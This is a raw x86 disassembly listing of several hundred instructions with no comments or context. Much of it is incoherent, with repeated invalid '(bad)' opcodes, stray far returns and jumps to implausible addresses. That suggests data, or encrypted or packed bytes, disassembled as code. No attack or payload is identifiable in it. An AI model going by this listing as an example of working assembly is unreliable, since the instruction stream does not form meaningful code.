  40e4d9:	mov    ebp,DWORD PTR [ebx]
  40e4db:	test   al,0x8b
  40e4dd:	push   ebp
  40e4de:	clc    
  40e4df:	xor    ecx,ebx
  40e4e1:	xor    ecx,esi
  40e4e3:	add    edx,ecx
  40e4e5:	add    eax,DWORD PTR [edx+0xca010f]
  40e4eb:	push   ebp
  40e4ec:	dec    ebp
  40e4ed:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e4f3:	stc    
  40e4f4:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e4fa:	scas   eax,DWORD PTR es:[edi]
  40e4fb:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e501:	xor    ebp,DWORD PTR [ebx]
  40e503:	xor    edi,DWORD PTR [ebx]
  40e505:	add    esi,DWORD PTR [edi+0x3]
  40e508:	mov    ecx,DWORD PTR [edi]
  40e50a:	clc    
  40e50b:	retf   0x55cb
  40e50e:	into   
  40e50f:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e516:	mov    eax,0x3376554d
  40e51b:	mov    esi,DWORD PTR [ebx]
  40e51d:	int3   
  40e51e:	add    edx,DWORD PTR [ebp+0x3]
  40e521:	xor    ecx,DWORD PTR [edi]
  40e523:	xor    ecx,edx
  40e525:	add    edx,DWORD PTR [ebp+0x3]
  40e528:	mov    ecx,DWORD PTR [edi]
  40e52a:	lock retf 0x4dfa
  40e52e:	stc    
  40e52f:	mov    ecx,DWORD PTR [eax]
  40e531:	or     BYTE PTR [ebp+0x4d],cl
  40e534:	jmp    0x104e5c4
  40e539:	dec    ebp
  40e53a:	dec    ebp
  40e53b:	(bad)  
  40e53c:	mov    ebx,esp
  40e53e:	clc    
  40e53f:	test   ebx,ecx
  40e541:	clc    
  40e542:	ror    DWORD PTR [ebp-0x2a],cl
  40e545:	mov    esi,ecx
  40e547:	call   0x33cc2afb
  40e54c:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e553:	retf   
  40e554:	ja     0x40e524
  40e556:	mov    ebp,DWORD PTR [eax-0x48]
  40e559:	dec    ebp
  40e55a:	xor    ecx,DWORD PTR [di+0x3]
  40e55e:	mov    esp,esp
  40e560:	clc    
  40e561:	push   ebp
  40e562:	retf   
  40e563:	mov    dl,bl
  40e565:	adc    esi,edx
  40e567:	jb     0x40e537
  40e569:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e56f:	call   0x4d6cb0f1
  40e574:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e57a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e57b:	fwait
  40e57c:	inc    ebp
  40e57d:	xor    cl,BYTE PTR [ebp-0x78]
  40e580:	mov    edx,edi
  40e582:	clc    
  40e583:	dec    ebp
  40e584:	retf   
  40e585:	mov    edx,ebx
  40e587:	call   0x560fb962
  40e58c:	scas   eax,DWORD PTR es:[edi]
  40e58d:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e593:	fwait
  40e594:	sub    esi,DWORD PTR [edx]
  40e596:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e59c:	lods   al,BYTE PTR ds:[esi]
  40e59d:	xor    esp,DWORD PTR [ebx]
  40e59f:	add    ecx,DWORD PTR [ebp-0x1c]
  40e5a2:	mov    edi,DWORD PTR [ebp-0x8]
  40e5a5:	mov    bl,cl
  40e5a7:	cmp    dl,bl
  40e5a9:	jb     0x40e579
  40e5ab:	add    dh,dl
  40e5ad:	dec    ebp
  40e5ae:	scas   eax,DWORD PTR es:[edi]
  40e5af:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e5b5:	shr    DWORD PTR [ebx],cl
  40e5b7:	into   
  40e5b8:	cmp    edx,esi
  40e5ba:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e5c0:	dec    ebp
  40e5c1:	dec    ebp
  40e5c2:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e5c8:	retf   
  40e5c9:	xor    edx,esi
  40e5cb:	add    ecx,esi
  40e5cd:	imul   ecx,edx
  40e5d0:	mov    DWORD PTR [ebp+0x8],edx
  40e5d3:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e5d6:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e5dc:	add    esi,DWORD PTR [ebx]
  40e5de:	mov    ah,0x3
  40e5e0:	inc    ebp
  40e5e1:	rdtsc  
  40e5e3:	xlat   BYTE PTR ds:[ebx]
  40e5e4:	pushf  
  40e5e5:	jge    0x40e570
  40e5e7:	xor    ebx,eax
  40e5e9:	sub    eax,DWORD PTR [ebp-0x73]
  40e5ec:	(bad)  
  40e5ed:	cmp    al,al
  40e5ef:	jb     0x40e576
  40e5f1:	add    al,bh
  40e5f3:	ror    DWORD PTR [ebp-0x7a],1
  40e5f6:	xor    edi,edi
  40e5f8:	add    edi,edi
  40e5fa:	jmp    0x40e649
  40e5fc:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e602:	dec    ebp
  40e603:	into   
  40e604:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e60a:	fwait
  40e60b:	shl    DWORD PTR [edx],cl
  40e60d:	retf   0x5588
  40e610:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e616:	add    eax,DWORD PTR [eax]
  40e618:	in     al,0x4d
  40e61a:	push   ebp
  40e61b:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e621:	gs add ch,cl
  40e624:	dec    ebp
  40e625:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e62b:	dec    ebp
  40e62c:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e632:	jge    0x40e602
  40e634:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e63a:	add    cl,dh
  40e63c:	dec    ebp
  40e63d:	dec    DWORD PTR [ebx-0x2c032375]
  40e643:	adc    BYTE PTR [ebp+0x1],0x8b
  40e647:	add    al,bl
  40e649:	jge    0x40e5d7
  40e64b:	push   0xffffff9b
  40e64d:	push   0x8b3032
  40e652:	shl    BYTE PTR [ebp+0x55],0x6a
  40e656:	xor    edi,edi
  40e658:	xor    edx,DWORD PTR [ebx+eax*1]
  40e65b:	inc    ebp
  40e65c:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e662:	dec    ebp
  40e663:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e669:	jbe    0x40e5f6
  40e66b:	mov    ebp,esp
  40e66d:	ror    bl,1
  40e66f:	enter  0x14ce,0xaf
  40e673:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e679:	push   ebp
  40e67a:	retf   0x5540
  40e67d:	push   ebp
  40e67e:	mov    esi,DWORD PTR [edx-0x1c]
  40e681:	mov    edx,ebx
  40e683:	cld    
  40e684:	(bad)  
  40e685:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e68c:	sti    
  40e68d:	add    dh,cl
  40e68f:	push   0xffffff94
  40e691:	call   FWORD PTR [ebx+0x3b5032d0]
  40e697:	mov    ecx,DWORD PTR [edi]
  40e699:	int3   
  40e69a:	pop    esi
  40e69b:	inc    ebp
  40e69c:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e6a2:	push   ebp
  40e6a3:	xor    esi,DWORD PTR [ebx]
  40e6a5:	mov    DWORD PTR [ebx],0xcace0f9c
  40e6ab:	aas    
  40e6ac:	push   ebp
  40e6ad:	inc    ebp
  40e6ae:	xor    edx,esi
  40e6b0:	add    edx,esi
  40e6b2:	mov    eax,DWORD PTR [ebx]
  40e6b4:	(bad)  
  40e6b5:	jmp    0x40e643
  40e6b7:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  40e6bd:	rol    ah,1
  40e6bf:	mov    esi,0xf133104d
  40e6c4:	mov    edx,0xff388d80
  40e6c9:	mov    dh,0xd1
  40e6cb:	cmp    edx,DWORD PTR [ebp+0xf]
  40e6ce:	mov    eax,DWORD PTR [edx-0x20]
  40e6d1:	add    BYTE PTR [ebp-0x75],bh
  40e6d4:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e6db:	fwait
  40e6dc:	retf   0x8632
  40e6df:	cmp    ebp,0x8
  40e6e2:	call   ebx
  40e6e4:	inc    ebp
  40e6e5:	inc    ebp
  40e6e6:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e6ec:	mov    esi,DWORD PTR [ecx]
  40e6ee:	enter  0x49c,0xc7
  40e6f2:	add    al,al
  40e6f4:	add    bl,al
  40e6f6:	(bad)  
  40e6f7:	clc    
  40e6f8:	enter  0x45,0x31
  40e6fc:	push   eax
  40e6fd:	pushf  
  40e6fe:	mov    edi,eax
  40e700:	int3   
  40e701:	or     al,al
  40e703:	test   DWORD PTR [edi],edi
  40e705:	clc    
  40e706:	gs inc ebp
  40e708:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e70e:	push   ss
  40e70f:	xor    ecx,DWORD PTR [ebp+0x3]
  40e712:	sub    edx,DWORD PTR [ecx-0x76]
  40e715:	dec    ebp
  40e716:	add    DWORD PTR [ebx+0x88d845],ecx
  40e71c:	mov    esi,DWORD PTR [ebx]
  40e71e:	or     BYTE PTR [ebx],al
  40e720:	cmp    edx,DWORD PTR [ecx-0x38]
  40e723:	dec    ebp
  40e724:	out    dx,eax
  40e725:	xor    eax,DWORD PTR [ebp+0x3]
  40e728:	mov    edx,DWORD PTR [ecx-0x28]
  40e72b:	dec    ebp
  40e72c:	add    BYTE PTR [ebx],dh
  40e72e:	push   0x518003
  40e733:	push   eax
  40e734:	add    BYTE PTR [ebx-0x300748b],cl
  40e73a:	sbb    BYTE PTR [ebp+0x45],cl
  40e73d:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e743:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e749:	dec    ebp
  40e74a:	inc    ebp
  40e74b:	xor    edx,esi
  40e74d:	add    edx,esi
  40e74f:	push   ecx
  40e750:	(bad)  
  40e751:	dec    ebp
  40e752:	mov    al,ds:0xc5e03dff
  40e757:	retf   
  40e758:	(bad)  
  40e759:	into   
  40e75a:	sub    bh,bh
  40e75c:	dec    esp
  40e75d:	adc    al,0x9c
  40e75f:	inc    ebp
  40e760:	push   ebp
  40e761:	test   DWORD PTR [edi],ecx
  40e763:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  40e76a:	jmp    0xc9b9f67e
  40e76f:	add    cl,dl
  40e771:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e77b:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e781:	rol    BYTE PTR [eax],0x54
  40e784:	clc    
  40e785:	gs jb  0x40e78f
  40e788:	mov    eax,DWORD PTR [ebp-0x30]
  40e78b:	xor    al,0x40
  40e78d:	sub    al,0xc7
  40e78f:	mov    ah,ch
  40e791:	add    DWORD PTR [ebp+0x4534f845],eax
  40e797:	sub    al,0x80
  40e799:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e7a0:	mov    ch,0xff
  40e7a2:	clc    
  40e7a3:	add    DWORD PTR [ebp+0x60],0x3d
  40e7a7:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e7ae:	inc    ebp
  40e7af:	dec    DWORD PTR [ebx-0x341ff701]
  40e7b5:	test   esi,ecx
  40e7b7:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e7bd:	push   eax
  40e7be:	add    DWORD PTR [ebp+0x0],eax
  40e7c1:	dec    ebx
  40e7c3:	or     al,0xce
  40e7c5:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e7cc:	into   
  40e7cd:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e7d3:	mov    esi,ecx
  40e7d5:	sar    bh,0x45
  40e7d8:	adc    al,0x8b
  40e7da:	clc    
  40e7db:	fadd   DWORD PTR [ebp+0x0]
  40e7de:	mov    ebp,DWORD PTR [edx+0x8]
  40e7e1:	push   edi
  40e7e2:	adc    BYTE PTR [eax+0x1],0x83
  40e7e6:	add    al,al
  40e7e8:	retf   
  40e7e9:	mov    ecx,esi
  40e7eb:	cld    
  40e7ec:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e7f2:	into   
  40e7f3:	add    BYTE PTR [ebx+0x756aec00],cl
  40e7f9:	jne    0x40e82e
  40e7fb:	inc    DWORD PTR [ebx]
  40e7fd:	rcl    BYTE PTR [ecx+0x50],1
  40e800:	push   eax
  40e801:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e807:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e80e:	sar    bh,0x84
  40e811:	or     BYTE PTR [ebx],al
  40e813:	push   eax
  40e814:	add    BYTE PTR [ebx+0x453cc845],cl
  40e81a:	pushf  
  40e81b:	xor    edi,eax
  40e81d:	pushf  
  40e81e:	mov    ah,0x89
  40e820:	test   eax,ebp
  40e822:	clc    
  40e823:	inc    ebp
  40e824:	inc    ebp
  40e825:	mov    DWORD PTR [eax+eax*8],esi
  40e828:	sub    al,0x32
  40e82a:	mov    BYTE PTR [ebx+ecx*4+0x54d8ec89],bl
  40e831:	dec    ebp
  40e832:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e836:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  40e83c:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e840:	or     DWORD PTR [ecx+0x45ff085c],0x0
  40e847:	shl    DWORD PTR [ebp-0x380064],1
  40e84d:	int3   
  40e84e:	lea    eax,[ebp+0x45fff860]
  40e854:	push   eax
  40e855:	cmp    al,0x75
  40e857:	pushf  
  40e858:	(bad)  
  40e859:	(bad)  
  40e85a:	pop    esp
  40e85b:	lods   al,BYTE PTR ds:[esi]
  40e85c:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e862:	mov    edi,DWORD PTR [esi]
  40e864:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e86b:	test   DWORD PTR [edi-0x8],edx
  40e86e:	inc    esi
  40e86f:	inc    ebp
  40e870:	add    BYTE PTR [eax],bh
  40e872:	push   0x8b809c
  40e877:	in     al,dx
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	mov    esi,DWORD PTR [ebx]
  40e87c:	cld    
  40e87d:	add    eax,DWORD PTR [eax+0xf013b]
  40e883:	adc    al,0x0
  40e885:	add    bh,bh
  40e887:	jmp    0xbde9a4
  40e88c:	add    BYTE PTR [ebp+0x45],cl
  40e88f:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e895:	dec    ebp
  40e896:	push   0x38033
  40e89b:	cmp    eax,DWORD PTR [eax]
  40e89d:	unpcklps xmm7,xmm0
  40e8a0:	jne    0x40e8a2
  40e8a2:	dec    DWORD PTR [ebx+0x5545cc18]
  40e8a8:	mov    DWORD PTR [ebx],esi
  40e8aa:	shl    BYTE PTR [ebx],1
  40e8ac:	inc    ebp
  40e8ad:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e8b3:	retf   0x5575
  40e8b6:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e8bc:	(bad)  
  40e8bd:	stc    
  40e8be:	in     al,dx
  40e8bf:	or     al,0x85
  40e8c1:	dec    ebp
  40e8c2:	clc    
  40e8c3:	xor    eax,DWORD PTR [ebp+0x3]
  40e8c6:	mov    ebp,ecx
  40e8c8:	rol    BYTE PTR [eax],1
  40e8ca:	inc    ebp
  40e8cb:	add    BYTE PTR [eax-0x7747ab3],bh
  40e8d1:	clc    
  40e8d2:	inc    ebp
  40e8d3:	retf   
  40e8d4:	mov    edx,ebx
  40e8d6:	in     al,dx
  40e8d7:	(bad)  
  40e8d8:	retf   
  40e8d9:	into   
  40e8da:	into   
  40e8db:	scas   eax,DWORD PTR es:[edi]
  40e8dc:	dec    ebp
  40e8dd:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e8e3:	sub    ecx,esi
  40e8e5:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e8e8:	(bad)  
  40e8e9:	mov    edi,eax
  40e8eb:	int3   
  40e8ec:	test   DWORD PTR [ecx-0x74baff08],ecx
  40e8f2:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40e8f9:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e8ff:	(bad)  
  40e901:	retf   0x559c
  40e904:	(bad)  
  40e905:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40e90c:	inc    ebp
  40e90d:	add    eax,0xeb9c4d3f
  40e912:	(bad)  
  40e913:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40e919:	xor    ecx,DWORD PTR [ebp+0x33]
  40e91c:	mov    eax,DWORD PTR [ebx]
  40e91e:	call   0xce50b426
  40e923:	retf   0x55d1
  40e926:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40e92c:	jmp    0x40e927
  40e92e:	add    BYTE PTR ds:0xebf44d8b,al
  40e934:	push   ebp
  40e935:	mov    ebp,DWORD PTR [ebx]
  40e937:	mov    eax,0x33f8558b
  40e93c:	retf   
  40e93d:	xor    ecx,esi
  40e93f:	add    edx,ecx
  40e941:	add    eax,DWORD PTR [edx+0xca010f]
  40e947:	push   ebp
  40e948:	dec    ebp
  40e949:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40e94f:	stc    
  40e950:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e956:	scas   eax,DWORD PTR es:[edi]
  40e957:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40e95d:	xor    ebp,DWORD PTR [ebx]
  40e95f:	xor    edi,DWORD PTR [ebx]
  40e961:	add    esi,DWORD PTR [edi+0x3]
  40e964:	mov    ecx,DWORD PTR [edi]
  40e966:	clc    
  40e967:	retf   0x55cb
  40e96a:	into   
  40e96b:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40e972:	test   al,0x4d
  40e974:	push   ebp
  40e975:	jbe    0x40e9aa
  40e977:	mov    esi,DWORD PTR [ebx]
  40e979:	mov    al,0x3
  40e97b:	push   ebp
  40e97c:	add    esi,DWORD PTR [ebx]
  40e97e:	rdpmc  
  40e980:	retf   0x5503
  40e983:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40e989:	dec    ebp
  40e98a:	stc    
  40e98b:	mov    ecx,DWORD PTR [eax]
  40e98d:	or     BYTE PTR [ebp+0x4d],cl
  40e990:	jmp    0x134ea20
  40e995:	dec    ebp
  40e996:	dec    ebp
  40e997:	(bad)  
  40e998:	mov    ebx,esp
  40e99a:	clc    
  40e99b:	test   ebx,ecx
  40e99d:	clc    
  40e99e:	ror    DWORD PTR [ebp-0x2a],cl
  40e9a1:	mov    esi,ecx
  40e9a3:	lock scas eax,DWORD PTR es:[edi]
  40e9a5:	inc    ebp
  40e9a6:	mov    esi,DWORD PTR [ebx]
  40e9a8:	hlt    
  40e9a9:	pushf  
  40e9aa:	jge    0x40e937
  40e9ac:	sub    ebx,esp
  40e9ae:	cmp    ecx,ebx
  40e9b0:	ja     0x40e980
  40e9b2:	mov    ebp,DWORD PTR [eax-0x58]
  40e9b5:	dec    ebp
  40e9b6:	xor    ecx,DWORD PTR [di+0x3]
  40e9ba:	mov    esp,esp
  40e9bc:	clc    
  40e9bd:	push   ebp
  40e9be:	retf   
  40e9bf:	mov    dl,bl
  40e9c1:	adc    esi,edx
  40e9c3:	jb     0x40e993
  40e9c5:	add    BYTE PTR [edi-0xb7474b3],ch
  40e9cb:	lock jge 0x40e999
  40e9ce:	sub    ecx,DWORD PTR [ebp+0x3b]
  40e9d1:	mov    esi,DWORD PTR [edi-0x20]
  40e9d4:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  40e9db:	mov    BYTE PTR [ebx-0x34b20729],cl
  40e9e1:	mov    edx,ebx
  40e9e3:	lock (bad) 
  40e9e5:	ror    esi,cl
  40e9e7:	push   ebp
  40e9e8:	scas   eax,DWORD PTR es:[edi]
  40e9e9:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40e9ef:	fwait
  40e9f0:	sub    esi,DWORD PTR [edx]
  40e9f2:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9f9:	xor    esp,DWORD PTR [ebx]
  40e9fb:	add    ecx,DWORD PTR [ebp-0x1c]
  40e9fe:	mov    edi,DWORD PTR [ebp-0x8]
  40ea01:	mov    bl,cl
  40ea03:	cmp    dl,bl
  40ea05:	jb     0x40e9d5
  40ea07:	add    dh,dl
  40ea09:	dec    ebp
  40ea0a:	scas   eax,DWORD PTR es:[edi]
  40ea0b:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40ea11:	shr    DWORD PTR [ebx],cl
  40ea13:	into   
  40ea14:	cmp    edx,esi
  40ea16:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40ea1c:	dec    ebp
  40ea1d:	dec    ebp
  40ea1e:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40ea24:	retf   
  40ea25:	xor    edx,esi
  40ea27:	add    ecx,esi
  40ea29:	imul   ecx,edx
  40ea2c:	mov    DWORD PTR [ebp+0x8],edx
  40ea2f:	xor    ecx,DWORD PTR [ebp+0x2b]
  40ea32:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40ea38:	add    esi,DWORD PTR [ebx]
  40ea3a:	rol    BYTE PTR [ebx],0x45
  40ea3d:	rdtsc  
  40ea3f:	xlat   BYTE PTR ds:[ebx]
  40ea40:	pushf  
  40ea41:	jge    0x40e9cc
  40ea43:	xor    esp,eax
  40ea45:	sub    eax,DWORD PTR [ebp-0x73]
  40ea48:	(bad)  
  40ea49:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40ea50:	dec    ebp
  40ea51:	xchg   BYTE PTR [ebx],dh
  40ea53:	inc    DWORD PTR [ebx]
  40ea55:	(bad)  
  40ea56:	jmp    0x40eaa5
  40ea58:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40ea5e:	dec    ebp
  40ea5f:	into   
  40ea60:	mov    ebp,DWORD PTR [edi-0x23737420]
  40ea66:	fwait
  40ea67:	shl    DWORD PTR [edx],cl
  40ea69:	retf   0x5588
  40ea6c:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40ea72:	add    eax,DWORD PTR [eax]
  40ea74:	in     al,0x4d
  40ea76:	push   ebp
  40ea77:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40ea7d:	gs add ch,cl
  40ea80:	dec    ebp
  40ea81:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40ea87:	dec    ebp
  40ea88:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40ea8e:	jge    0x40ea5e
  40ea90:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ea96:	add    cl,dh
  40ea98:	dec    ebp
  40ea99:	dec    DWORD PTR [ebx-0x2c032301]
  40ea9f:	inc    ebp
  40eaa0:	push   ebp
  40eaa1:	dec    DWORD PTR [ebx-0x73ff1f34]
  40eaa7:	lea    ebx,[ebx-0x7400cdac]
  40eaad:	push   eax
  40eaae:	mov    ah,0x45
  40eab0:	push   ebp
  40eab1:	mov    esi,DWORD PTR [ebx]
  40eab3:	les    esi,FWORD PTR [ebx]
  40eab5:	add    BYTE PTR [ebx],al
  40eab7:	inc    DWORD PTR [ebx]
  40eab9:	mov    ecx,DWORD PTR [edi]
  40eabb:	cld    
  40eabc:	retf   0x4d80
  40eabf:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40eac5:	jne    0x40ea52
  40eac7:	(bad)  
  40eac8:	in     al,dx
  40eac9:	ror    bl,1
  40eacb:	scas   al,BYTE PTR es:[edi]
  40eacc:	into   
  40eacd:	add    BYTE PTR [edi-0xf2f7475],ch
  40ead3:	not    bl
  40ead5:	adc    al,0xca
  40ead7:	inc    ebp
  40ead8:	push   ebp
  40ead9:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40eadf:	push   0xaf80d6
  40eae4:	mov    eax,DWORD PTR [eax]
  40eae6:	fdiv   st(7),st
  40eae8:	sti    
  40eae9:	sbb    dh,cl
  40eaeb:	pop    esi
  40eaec:	xchg   esp,eax
  40eaed:	leave  
  40eaee:	fwait
  40eaef:	add    al,0x32
  40eaf1:	push   ebp
  40eaf2:	cmp    ebp,esp
  40eaf4:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40eaf8:	dec    DWORD PTR [ecx-0x740f0375]
  40eafe:	push   ebp
  40eaff:	cld    
  40eb00:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40eb06:	retf   0x558b
  40eb09:	clc    
  40eb0a:	xor    esi,eax
  40eb0c:	add    esi,DWORD PTR [ebp-0x75]
  40eb0f:	(bad)  
  40eb10:	hlt    
  40eb11:	or     cl,BYTE PTR [esi+eax*8-0x39cdf765]
  40eb18:	mov    DWORD PTR [edx],ecx
  40eb1a:	hlt    
  40eb1b:	(bad)  
  40eb1c:	dec    ebp
  40eb1d:	add    dh,BYTE PTR [ebx]
  40eb1f:	leave  
  40eb20:	mov    edx,0xffec8d55
  40eb25:	push   ecx
  40eb26:	rol    DWORD PTR [ebp+0x55],1
  40eb29:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40eb2f:	mov    eax,0xf8030b33
  40eb34:	lar    ecx,di
  40eb37:	push   ebp
  40eb38:	retf   0x863b
  40eb3b:	jne    0x40eb3a
  40eb3d:	mov    edi,edi
  40eb3f:	or     BYTE PTR [ebp+0x41],dh
  40eb42:	mov    ebp,edx
  40eb44:	cld    
  40eb45:	inc    eax
  40eb46:	mov    al,0x25
  40eb48:	add    DWORD PTR [ecx+0x0],eax
  40eb4b:	in     eax,dx
  40eb4c:	test   DWORD PTR [ecx-0x1],eax
  40eb4f:	(bad)  
  40eb51:	ret    0x8b
  40eb54:	cld    
  40eb55:	mov    eax,DWORD PTR [eax+0x8d0151]
  40eb5b:	clc    
  40eb5c:	xor    BYTE PTR [ebp+0x45],al
  40eb5f:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40eb65:	loopne 0x40eb66
  40eb67:	mov    edi,edi
  40eb69:	mov    ecx,eax
  40eb6b:	clc    
  40eb6c:	jne    0x40eb3e
  40eb6e:	call   0x81fc77
  40eb73:	and    eax,0xc6854575
  40eb78:	je     0x40eb7b
  40eb7a:	mov    eax,esi
  40eb7c:	cld    
  40eb7d:	or     DWORD PTR [eax+0x401c9],eax
  40eb83:	push   ebp
  40eb84:	add    ah,ch
  40eb86:	add    BYTE PTR [ecx+0x6a],dl
  40eb89:	inc    ebp
  40eb8a:	push   esi
  40eb8b:	mov    DWORD PTR [eax-0x4],edx
  40eb8e:	pop    edi
  40eb8f:	mov    ebx,DWORD PTR [ebx-0x4]
  40eb92:	ret    0xb8
  40eb95:	push   es
  40eb96:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40eb9c:	clc    
  40eb9d:	lock inc ebp
  40eb9f:	jne    0x40ebf7
  40eba1:	(bad)  
  40eba2:	jne    0x40eba8
  40eba4:	mov    eax,0xf841ba66
  40eba9:	fiadd  DWORD PTR [esi]
  40ebab:	(bad)  
  40ebac:	jne    0x40ebeb
  40ebae:	cmp    eax,ebx
  40ebb0:	pop    esi
  40ebb1:	mov    ecx,DWORD PTR [eax]
  40ebb3:	push   ecx
  40ebb4:	inc    ecx
  40ebb5:	lea    edi,[esi-0x8]
  40ebb8:	inc    edx
  40ebb9:	inc    ebp
  40ebba:	int    0x8b
  40ebbc:	inc    edx
  40ebbd:	cld    
  40ebbe:	jle    0x40eb7f
  40ebc0:	inc    ecx
  40ebc1:	xchg   eax,esp
  40ebc3:	mov    ebx,eax
  40ebc5:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ebcb:	or     edi,eax
  40ebcd:	inc    ebp
  40ebce:	inc    ebp
  40ebcf:	(bad)  
  40ebd0:	mov    ecx,DWORD PTR [eax]
  40ebd2:	cld    
  40ebd3:	(bad)  
  40ebd4:	jmp    0x40ebd7
  40ebd6:	mov    eax,esi
  40ebd8:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ebde:	rcl    BYTE PTR [esi+0xf],1
  40ebe1:	iret   
  40ebe2:	inc    ebp
  40ebe3:	leave  
  40ebe4:	(bad)  
  40ebe5:	dec    DWORD PTR [ecx]
  40ebe7:	mov    eax,esi
  40ebe9:	mov    eax,DWORD PTR [edi]
  40ebeb:	mov    dh,0xdd
  40ebee:	push   es
  40ebef:	nop
  40ebf0:	(bad)  
  40ebf1:	inc    DWORD PTR [ebx]
  40ebf3:	push   esi
  40ebf4:	leave  
  40ebf5:	iret   
  40ebf6:	add    al,0x46
  40ebf8:	push   ebp
  40ebf9:	jmp    0xff9241ea
  40ebfe:	inc    ebp
  40ebff:	push   esi
  40ec00:	mov    DWORD PTR [esi-0x4],eax
  40ec03:	in     eax,dx
  40ec04:	push   ebp
  40ec05:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ec0b:	add    al,BYTE PTR [edx]
  40ec0d:	mov    edx,DWORD PTR [ebp-0x17]
  40ec10:	cmp    edi,esi
  40ec12:	jne    0x40ec13
  40ec14:	(bad)  
  40ec15:	push   esi
  40ec16:	pop    es
  40ec17:	push   ebp
  40ec18:	mov    ebp,esp
  40ec1a:	or     BYTE PTR [ebp+0x41],al
  40ec1d:	add    edi,esp
  40ec1f:	sub    BYTE PTR [eax-0x4],al
  40ec22:	retf   0xc275
  40ec25:	add    DWORD PTR [eax],eax
  40ec27:	sbb    al,0x8b
  40ec29:	mov    edx,DWORD PTR [ecx+0x14]
  40ec2c:	lea    edx,[edx-0x1ba7508]
  40ec32:	push   esi
  40ec33:	enter  0xd375,0xb8
  40ec37:	test   DWORD PTR [esi],0x6ce0750
